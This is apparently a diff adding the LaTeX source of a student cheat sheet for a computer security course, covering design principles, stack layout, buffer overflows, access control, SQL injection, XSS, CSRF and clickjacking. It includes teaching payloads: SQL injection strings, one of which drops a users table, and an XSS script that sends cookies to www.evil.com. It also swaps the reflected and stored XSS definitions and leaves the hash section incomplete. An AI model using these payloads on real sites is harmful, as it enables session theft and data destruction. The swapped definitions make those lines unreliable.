@@ -1,0 +1,279 @@
+\documentclass[10pt,landscape]{article}
+\usepackage[utf8]{inputenc}
+\usepackage{multicol}
+\usepackage{calc}
+\usepackage{ifthen}
+\usepackage[landscape]{geometry}
+\usepackage{hyperref}
+\usepackage{amsmath, amssymb, amsthm, bm, hyperref, float, mathtools}
+\usepackage{minted}
+\usepackage{graphicx}
+\usepackage{enumitem}
+\usepackage{sectsty}
+
+% Use images folder as root path for images
+\graphicspath{ {images/} }
+
+% Remove extra spacing on bullet points
+\setlist[itemize]{nosep,leftmargin=*}
+\setlist[enumerate]{nosep,leftmargin=*}
+
+% This sets page margins to .5 inch if using letter paper, and to 1cm
+% if using A4 paper. (This probably isn't strictly necessary.)
+% If using another size paper, use default 1cm margins.
+\ifthenelse{\lengthtest { \paperwidth = 11in}}
+    { \geometry{top=.5in,left=.5in,right=.5in,bottom=.5in} }
+    {\ifthenelse{ \lengthtest{ \paperwidth = 297mm}}
+        {\geometry{top=1cm,left=1cm,right=1cm,bottom=1cm} }
+        {\geometry{top=1cm,left=1cm,right=1cm,bottom=1cm} }
+    }
+
+% Turn off header and footer
+\pagestyle{empty}
+
+
+% Redefine section commands to use less space
+\makeatletter
+
+\sectionfont{\normalsize}
+\subsectionfont{\small}
+\subsubsectionfont{\small}
+\paragraphfont{\small}
+
+\makeatother
+
+% Define BibTeX command
+\def\BibTeX{{\rm B\kern-.05em{\sc i\kern-.025em b}\kern-.08em
+    T\kern-.1667em\lower.7ex\hbox{E}\kern-.125emX}}
+
+% Don't print section numbers
+\setcounter{secnumdepth}{0}
+
+\setlength{\parindent}{0pt}
+\setlength{\parskip}{0pt plus 0.5ex}
+
+% -----------------------------------------------------------------------
+
+\DeclarePairedDelimiter{\ceil}{\lceil}{\rceil}
+\newcommand{\expect}[1]{\mathbf{E}[#1]}
+\newcommand{\var}[1]{\text{Var(#1)}}
+\newcommand{\cov}[1]{\text{Cov(#1)}}
+\newcommand{\identity}{\mathbf{I}}
+
+% -----------------------------------------------------------------------
+
+\begin{document}
+
+\raggedright
+\footnotesize
+\begin{multicols}{3}
+
+\setlength{\premulticols}{1pt}
+\setlength{\postmulticols}{1pt}
+\setlength{\multicolsep}{1pt}
+\setlength{\columnsep}{2pt}
+
+% =============================================================================
+
+\section{Principles for Secure Systems}
+
+\begin{enumerate}
+    \item \textit{Security is economics.} No system is completely secure, but they may only need to resist a certain level of attack.
+    \item \textit{Least privilege.} Give a program the minimum set of access privilege that it needs to do its job, and nothing more.
+    \item \textit{Use fail-safe defaults.} Start by denying all access, then allow only that which is explicitly permitted. For example, if a firewall fails it drops, rather than passes, all packets.
+    \item \textit{Separation of responsibility.} Require more than one party to approve before access is granted. No one program has complete power.
+    \item \textit{Defense in depth.} Use redundant measures to enforce systems.
+    \item \textit{Psychological acceptability.} Users need to buy into the security model, otherwise they will ignore it or actively seek to subvert it.
+    \item \textit{Human factors matter.} For example, we tend to ignore errors when they pop up.
+    \item \textit{Ensure complete mediation.} Make sure to check every access to every object when enforcing access control policies.
+    \item \textit{Know your threat model.} Design security measures to account for attackers; be careful with old/outdated assumptions.
+    \item \textit{Detect if you can't prevent.} Log entries so you have some way to analyze break-ins after the fact.
+    \item \textit{Don't rely on security through obscurity.} Hard to keep design of system secret from a sufficiently motivated adversary (\textit{brittle security}).
+    \item \textit{Design security in from the start.} Trying to retrofit security into an existing application is difficult/impossible.
+    \item \textit{Conservative design.} Systems should be evaluated under the worst security failure that is at all plausible, under assumptions favorable to the attacker.
+    \item \textit{Kerkhoff's principle.} Cryptosystems should remain secure even when the attacker knows all details about the system except the key. (don't rely on security through obscurity).
+    \item \textit{Proactively study attacks.} We should devote considerable effort to trying to break our own systems before attackers do.
+\end{enumerate}
+
+% =============================================================================
+
+\section{Memory Layout}
+
+\subsection{Registers}
+
+\begin{tabular}{@{}ll@{}}
+\texttt{sfp}    & saved \%ebp on stack \\
+\texttt{ofp}    & old \%ebp from previous stack frame \\
+\texttt{rip}    & return instruction pointer on stack \\
+\texttt{\%eax}  & stores return value \\
+\texttt{\%ebp}  & base pointer, indicates start of stack frame. \\
+\texttt{\%esp}  & stack pointer, indicates bottom of stack. \\
+\texttt{\%eip}  & instruction pointer, points to next instruction to run. \\
+\end{tabular}
+
+\subsection{Function Call}
+
+\texttt{\%esp} advances whenever we push anything to the stack
+
+Before the \texttt{call} instruction, push args in reverse order and push return address onto stack
+
+\begin{tabular}{@{}ll@{}}
+\texttt{prologue}   & \texttt{push \%ebp} \\
+                    & \texttt{mov \%esp, \%ebp} \\
+                    & \texttt{sub \$???, \%esp} \\
+\texttt{...} \\
+\texttt{leave}      & \texttt{mov \%ebp, \%esp} \\
+                    & \texttt{pop \%ebp} \\
+\texttt{ret}        & \texttt{pop \%eip} \\
+\end{tabular}
+
+
+\includegraphics[scale=0.26]{memory.png}
+
+\includegraphics[scale=0.22]{stack_frame.png}
+
+
+\section{Memory Safety}
+
+\textbf{Preconditions}: what must hold for the function to operate correctly \\
+\textbf{Postconditions}: what holds after a function completes \\
+
+\subsection{Buffer overflow}
+
+Can overwrite stack variables (such as return address) in order to jump to malicious code when frame exits
+
+\textit{Return-oriented programming (ROP)} is a computer security exploit technique that allows an attacker to execute code in the presence of security defenses such as non-executable memory and code signing. In this technique, an attacker gains control of the call stack to hijack program control flow and then executes carefully chosen machine instruction sequences, called "gadgets". Each gadget typically ends in a return instruction and is located in a subroutine within the existing program and/or shared library code. Chained together, these gadgets allow an attacker to perform arbitrary operations on a machine employing defenses that thwart simpler attacks.
+
+\textbf{Potential fixes}
+
+\textit{Stack canary} can be added by the compiler and randomly generated at runtime. Placed immediately below the saved frame pointer in the activation record. Program checks to see if this value has been changed.
+
+\textit{ASLR (address randomization)}: starts the stack at random place in memory rather than a fixed point, so attacker cannot hardcode addresses
+
+\texttt{gets} can be halted with \texttt{0x0A} and \texttt{0x00}. Could potentially be an issue in buffer overflow attacks.
+
+
+\section{Access Control}
+
+subject, object, policy - policy consists of rules access(S, O). Can be put in an \textit{access control matrix}. \\
+finer-grained permissions (read, write, execute) \\
+\textit{Reference monitor}: sits between subject and object, responsible for checking permissions. Should be unbypassable, tamper-resistant, verifiable.
+
+\textit{Centralized enforcement}: database centrally checks policy for each access \\
+\textit{Integrated access control}: verifies policy whenever there is data access; more flexible, but more prone to errors
+
+\textit{Trusted Computing Base}: Part of the system that we rely on to operate correctly. If it misbehaves, the whole system is vulnerable. Try to keep this as small as possible. \\
+\textit{Time-of-check-to-time-of-use}: race conditions.
+
+\textit{Confidentiality}: set of rules that limits access \\
+\textit{Integrity}: assurance that data is trustworthy/accurate \\
+\textit{Availability}: guarantee of access to information by authorized entities
+
+\textit{Authorization}: who should be able to perform what actions \\
+\textit{Authentication}: verifying who is requesting the action
+
+\textbf{Authentication}
+
+Server should authenticate client (passwords, key, fingerprint, etc.) \\
+Client should authenticate server (certificates) \\
+\textit{2-factor auth} uses two of (knowledge, possession, attributes)
+
+% WEB SECURITY ================================================================
+
+\section{Web Security}
+
+\begin{enumerate}
+\item \textit{Integrity}: malicious websites should not be able to tamper with integrity of my computer or my information on other websites
+\item \textit{Confidentiality}: malicious websites should not be able to learn confidential information from my computer or other sites
+\item \textit{Privacy}: malicious sites should not be able to spy on me or my activities online
+\end{enumerate}
+
+\section{SQL Injection}
+
+Can use \texttt{--} to comment out rest of the line, \texttt{;} to chain queries
+
+Sanitize user input (whitelist characters or escape input string to not include special characters \texttt{', +, -, ;}
+
+\textit{Prepared statements}: Predefined allowed commands
+
+\begin{verbatim}
+SELECT ... where user=' ' or 1=1; --
+SELECT ... where user=' '; DROP TABLE Users; --
+\end{verbatim}
+
+\section{Same-Origin Policy}
+
+\texttt{origin = protocol + hostname + port}
+
+Enforced by web browsers; each site in the browser is isolated from all others but multiple pages from same site are not isolated
+
+Cross-origin communication allowed through \texttt{postMessage}, receiving origin decides whether or not to accept
+
+
+\section{XSS Attacks}
+
+\textit{Reflected}: attacker places Javascript on benign web service for victim to load \\
+\textit{Stored}: attacker gets user to click on specially-crafted URL with script in it, web service reflects it back
+
+\textbf{Example payloads}
+
+\begin{verbatim}
+<script>window.open("www.evil.com/sendcookie?cookie="
+    + Document.cookie)</script>
+\end{verbatim}
+
+\begin{verbatim}
+<img href="test.png" onerror="alert()"></img>
+\end{verbatim}
+
+\section{Sessions}
+
+\textbf{Cookie Scope}
+
+\texttt{domain} can be any domain suffix of URL-hostname except top-level TLD.
+
+Browser sends all cookies in URL-Scope: \texttt{cookie-domain} is domain suffix of URL-domain, \texttt{cookie-path} is prefix of URL-path. For example, a cookie with
+\texttt{domain = example.com} and \texttt{path = /some/path/} will be included on a request to \texttt{http://foo.example.com/some/path/subdir/hello.txt}
+
+\begin{tabular}{@{}ll@{}}
+\texttt{domain}     & when to send \\
+\texttt{path}       & when to send \\
+\texttt{secure}     & only send over HTTPS \\
+\texttt{expires}    & when to expire the cookie \\
+\texttt{HTTPOnly}   & cookie cannot be accessed by Javascript \\
+\end{tabular}
+
+
+\section{Cross-Site Request Forgery (CSRF)}
+
+Attacker makes a request on a victim's behalf, which looks like a legitimate request to the webserver. Uses victim's cookies (and thus their session)
+
+Can be prevented via a CSRF token included in the form and the cookie. Attacker cannot POST form because they don't know the CSRF token, so webserver will reject request. Fails under XSS attacks.
+
+\section{Clickjacking}
+
+Renders another site's frame transparently over a seemingly innocent website; correct placement of buttons can lead user to click on buttons and trigger actions on other sites
+
+Can exploit both \textit{visual} and \textit{temporal} integrity. Visual is hiding what's visible, temporal is like changing a link just as the user clicks on it.
+
+\textit{Framekiller/framebuster} scripts can mitigate attack by checking if the website is being rendered in a frame
+
+% =============================================================================
+
+\section{Encryption}
+
+\textit{Confidentiality}: prevent adversaries from reading private data \\
+\textit{Integrity}: prevent data from being altered \\
+\textit{Authenticity}: determine who created a document
+
+\subsection{Cryptographic Hash Functions}
+
+\textit{One-way}: \\
+\textit{Second preimage-resistant}: \\
+\textit{One-way}: \\
+
+
+% =============================================================================
+
+\end{multicols}
+\end{document}
